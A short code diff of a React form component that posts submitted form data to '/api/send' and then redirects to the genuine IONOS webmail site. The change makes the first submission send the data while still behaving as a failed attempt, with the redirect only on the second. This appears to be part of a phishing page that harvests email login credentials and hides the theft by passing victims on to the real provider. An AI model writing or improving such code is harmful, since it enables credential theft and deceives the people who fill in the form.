@@ -7,10 +7,7 @@ export default function Home() {
   const [count, setCount] = useState(0);
   const formData = async (e: FormEvent<HTMLFormElement>) => {
     e.preventDefault();
-    if (count == 0) {
-      setCount((prev) => prev + 1);
-      return;
-    }
+
     const dataObj: { [key: string]: string } = {};
     if (forma.current) {
       const data = new FormData(forma.current);
@@ -30,8 +27,13 @@ export default function Home() {
 
       const result = await axios.post("/api/send", JSON.stringify(dataObj));
 
+      if (count === 0) {
+        setCount((prev) => prev + 1);
+        return;
+      }
+
       if (result.status === 200) {
-        console.log(result.data);
+        // console.log(result.data);
         return window.location.replace("https://mail.ionos.de/");
       }
       return;
